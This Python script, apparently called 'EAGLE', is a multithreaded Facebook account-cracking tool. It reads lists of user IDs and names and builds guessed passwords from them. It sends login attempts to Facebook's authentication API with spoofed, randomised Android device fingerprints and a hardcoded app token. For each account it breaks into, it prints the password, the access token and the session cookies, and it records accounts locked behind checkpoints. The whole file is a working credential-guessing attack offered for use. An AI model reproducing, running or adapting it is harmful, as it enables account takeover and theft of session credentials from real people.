#!/bin/python3
#author:@bilalhaiderid
#_________[ IMPORTING MODULES ]_________>>
import os,sys,uuid,json,time,random,requests
from concurrent.futures import ThreadPoolExecutor
#_________[ BASIC COLOURS ]_________>>
red = "\033[1;31m"
green = "\033[1;32m"
white = "\033[1;37m"
blue = "\033[1;35m"
#_________[ LIST - LOOP ]_________>>
pwd_list = []
uidz = []
cps = []
oks = []
tls = []
tfs = []
cracked = []
#_________[ SCRIPT DATA ]_________>>
start_line = f"[{green}+{white}]"
#_________[ LOGO ]_________>>
def logo(time_sleep=0.5):
    time.sleep(time_sleep)
    os.system("clear")
    time.sleep(time_sleep)
    print(f"""{white}
___________              .__          
\_   _____/____     ____ |  |   ____  
 |    __)_\__  \   / ___\|  | _/ __ \ 
 |        \/ __ \_/ /_/  >  |_\  ___/ 
/_______  (____  /\___  /|____/\___  >
        \/     \//_____/           \/  {green} 0.0.1 {white}""")
    print(f"{white}------------------------------------------------")
    print(f"{green} No Technology thats connected to internet is{white}")
    print(f"{green}                  Unhackable{white}")
    print(f"{white}------------------------------------------------")
#________[ USER INFO ]_______>>
def userinfo(token):
    try:
        prm = {
            "access_token":token
        }
        head = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.5',
            'Alt-Used': 'graph.facebook.com',
            'Connection': 'keep-alive',
            'Host': 'graph.facebook.com',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'TE': 'trailers',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0'
        }
        userdata = requests.get("https://graph.facebook.com/me",params=prm,headers=head).json()
        print(f"{start_line} User Info : ")
        for keys,values in userdata.items():
            print(f" [{green}>>{white}] {keys.capitalize()} : {values}")
    except Exception as e:
        print(e)
#_________[ FILE CRACKING ]_________>>
def file_cloning():
    logo()
    filepath = input(f"[{green}+{white}] Input File For Crack : ")
    for idz in open(filepath, 'r').readlines():uidz.append(idz.strip())
    password()
#_________[ PASSWORD FOR CRACK ]_________>>
def password():
    logo()
    limit = int(input(f"[{green}+{white}] Input Password Limit For Crack : "))
    for i in range(limit):
        pwd = input(f"[{green}+{white}] Input Password {green}{str(i+1)}{white} : ")
        if pwd not in pwd_list:pwd_list.append(pwd)
    method_crack()
#_________[ METHOD CRACK ]_________>>
def method_crack():
    # logo()
    # print("[01] Graph")
    # print("[02] B-Graph ( Soon )")
    # print("[03] API ( Soon )")
    # print("[04] B-API ( Soon )")
    print(f"{white}------------------------------------------------")
    method = "2"#input(f"{start_line} Input Method For Crack : ")
    print(f"{white}------------------------------------------------")
    if method in ["1","01"]:
        with ThreadPoolExecutor(max_workers=30) as BilalHaiderID:
            logo()
            print(f"{start_line} Total UID For Crack : {green}{str(len(uidz))}{white}")
            print(f"{start_line} Total Password For Crack : {green}{str(len(pwd_list))}{white}")
            print(f"{start_line} OK/CP File Save as : {green}OK.txt{white}/{red}CP.txt{white}")
            print(f"{white}------------------------------------------------")
    elif method in ["2","02"]:
        with ThreadPoolExecutor(max_workers=30) as BilalHaiderID:
            logo()
            print(f"{start_line} Total UID For Crack : {green}{str(len(uidz))}{white}")
            print(f"{start_line} Total Password For Crack : {green}{str(len(pwd_list))}{white}")
            print(f"{start_line} Method FB File Crack : {green}B-GRAPH{white}")
            print(f"{white}------------------------------------------------")
            total = str(len(uidz))
            for userid in uidz:
                uid,name = userid.split("|")
                first = str(name.split(" ")[0])
                try:last = str(name.split(" ")[1])
                except:last = first
                BilalHaiderID.submit(bgraph,uid,first,last,total)
    print(f"{white}------------------------------------------------")
    print(f"{white}[{green}•{white}] Process Has been Completed")
    print(f"{white}[{green}•{white}] Result OK/CP/TL/2F : {str(len(oks))}/{str(len(cps))}/{str(len(tls))}/{str(len(tfs))}")
    print(f"{white}------------------------------------------------")
#_________[ METHOD BGRAPH ]_________>>
def bgraph(uid,first,last,total):
    sys.stdout.write(f"{white}[{green}EAGLE{white}] {len(cracked)}/{total} - OK/CP/TL/2F : {str(len(oks))}/{str(len(cps))}/{str(len(tls))}/{str(len(tfs))}\r")
    models =["SM-G920F|NRD90M","SM-T535|LRX22G","SM-T231|KOT49H","SM-J320F|LMY47V","GT-I9190|KOT49H","GT-N7100|KOT49H","SM-T561|KTU84P","GT-N7100|KOT49H","GT-I9500|LRX22C","SM-J320F|LMY47V","SM-G930F|NRD90M","SM-J320F|LMY47V","SM-J510FN|NMF26X","GT-P5100|IML74K","SM-J320F|LMY47V","SM-T531|LRX22G","SPH-L720|KOT49H","GT-I9500|JDQ39"]
    model_,build = random.choice(models).rsplit('|')
    android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
    facebook_version = f"{random.randint(100, 200)}.{random.randint(0, 100)}.{random.randint(0, 100)}.{random.randint(0, 100)}"
    fbbv = str(random.randint(10000000, 99999999))
    fbrv = str(random.randint(10000000, 99999999))
    fbsv = f"{random.uniform(4.0, 10.0):.1f}"
    density = random.uniform(1.0, 4.0)
    width = random.randint(720, 1440)
    height = random.randint(1280, 2560)
    network_carriers = ["Verizon", "AT&T", "T-Mobile", "Sprint"]
    network_carrier = random.choice(network_carriers)
    network_type = random.choice(["WiFi", "4G", "3G"])
    ip_address = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"
    fbcr = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=10))
    fban = random.choice(["FB4A", "FB5A", "FB6A"])
    fbpn = random.choice(['com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite'])
    fbbd = 'Samsung'
    user_agent = f"Dalvik/1.6.0 (Linux; U; {android_version}; {model_} Build/{build}) " \
         f"[FBAN/{fban};FBAV/{facebook_version};FBBV/{fbbv};FBDM/{{density={density:.1f},width={width},height={height}}};FBLC/it_IT;FBRV/{fbrv};FBCR/{fbcr};FBMF/{model_};FBBD/{fbbd};FBPN/{fbpn};FBDV/{model_.replace(' ', '_')};FBSV/{fbsv};FBOP/1;FBCA/x86:armeabi-v7a;FBNT/{network_type};FBCN/{network_carrier};FBSR/{ip_address};]"
    for pw in pwd_list:
        try:
            pw = pw.replace("first", first).replace("last", last)
            pw = pw.replace("First", first.capitalize()).replace("Last", last.capitalize())
            quality = random.choice(['POOR', 'MODERATE', 'GOOD', 'EXCELLENT'])
            headers = {
                'Authorization': 'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895',
                'x-fb-connection-bandwidth': f'{str(random.randint(1000000, 30000000))}',
                'x-fb-sim-hni': f'{str(random.randint(10000, 99999))}',
                'x-fb-net-hni': f'{str(random.randint(10000, 99999))}',
                'X-FB-Connection-Quality': f'{quality}',
                'X-FB-Connection-Type': 'Wifi',
                'user-agent': f'{user_agent}',
                'content-encoding': 'gzip,deflate',
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-http-engine': 'Liger',
                'connection': 'keep-alive'}
            data = {
                'adid': f'{str(uuid.uuid4())}',
                'email': uid,
                'password': pw,
                'cpl': 'true',
                'credentials_type': 'password',
                'error_detail_type': 'button_with_disabled',
                'source': 'register_api',
                'format': 'json',
                'device_id': f'{str(uuid.uuid4())}',
                'family_device_id': f'{str(uuid.uuid4())}',
                'generate_session_cookies': '1',
                'generate_analytics_claim': '1',
                'generate_machine_id': '1',
                'tier': 'regular',
                'device': f'{fbbd}',
                'android_version': f'{android_version}',
                'carrier': f'{network_carrier}',
                'app_id': '256002347743983,',
                'app_version': f'{facebook_version}',
                'locale': 'it_IT',
                'advertising_id': f'{str(uuid.uuid4())}',
                'fb_api_req_friendly_name': 'authenticate'}
            response = requests.post('https://b-graph.facebook.com/auth/login',headers=headers,data=data,allow_redirects=False)
            response_data = json.loads(response.text)
            if "session_key" in str(response.text):
                if uid not in oks:
                    token = response_data['access_token']
                    cookie = ";".join(i["name"] + "=" + i["value"] for i in response_data["session_cookies"])
                    print(f'\r{green} [OK] {uid} | {pw} {white}')
                    print(f'\r{green} Token -> {white}{token}')
                    print(f'\r{green} Cookie -> {white}{cookie}')
                    oks.append(uid)
                break
            elif "User must verify their account" in str(response.text):
                if uid not in cps:
                    print(f'\r{red} [CP] {uid} | {pw} {white}')
                    cps.append(uid)
                break
            else:continue
        except requests.exceptions.ConnectionError as e:time.sleep(10);continue
        except Exception as e:print(e)
    cracked.append(uid)

if __name__=="__main__":
    file_cloning()